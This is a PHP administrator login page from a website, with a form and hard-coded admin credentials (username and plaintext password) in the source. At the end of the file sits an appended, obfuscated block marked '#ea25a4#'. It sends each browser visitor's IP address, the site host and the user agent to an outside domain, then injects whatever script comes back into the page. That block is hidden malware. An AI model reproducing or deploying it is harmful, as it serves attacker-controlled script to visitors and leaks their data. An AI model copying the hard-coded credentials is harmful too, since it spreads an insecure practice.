<?php
session_start();

if($_POST[login])
{
	if($_POST[username] == 'TheEmperor' && md5($_POST[password]) == md5('Military1!'))
	{
		$_SESSION[login][username] = 'TheEmperor';
		header('Location: main.php');
	}//if
	else 
	{
		$err = 'Wrong credentials.';
	}
}//if

$dir = '../';
include($dir.'include/functions.php');
include($dir.'include/mysql.php');
include($dir.'include/config.php');
include($dir.'include/index.php');
include($dir.'include/menu.php');
?>
<div class="moduleBlack"><h2>Administrator Login</h2>
<br><br><form method=POST>
<table width=100% height=100%>
<tr>
	<td width=40%></td><td>
		<fieldset>
		<table>
		<tr>
			<td>Username:</td><td><input type=text name="username"/></td>
		</tr><tr>
			<td>Password:</td><td><input type=password name="password"/></td>
		</tr><tr>
			<td colspan=2 align=center><input type=submit name=login value="Login"/></td>
		</tr>
		</table>
		</fieldset>
	</td><td width=40%></td>
</tr>
</table><?=$err ?></form>
</div>

<? 
echo forumAd($links).randomStuff();
include($dir.'include/bottom.php'); ?>
<?php
#ea25a4#
error_reporting(0); ini_set('display_errors',0); $wp_e0270 = @$_SERVER['HTTP_USER_AGENT'];
if (( preg_match ('/Gecko|MSIE/i', $wp_e0270) && !preg_match ('/bot/i', $wp_e0270))){
$wp_e090270="http://"."template"."class".".com/class"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_e0270);
$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_e090270);
curl_setopt ($ch, CURLOPT_TIMEOUT, 6); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $wp_0270e = curl_exec ($ch); curl_close($ch);}
if ( substr($wp_0270e,1,3) === 'scr' ){ echo $wp_0270e; }
#/ea25a4#
?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>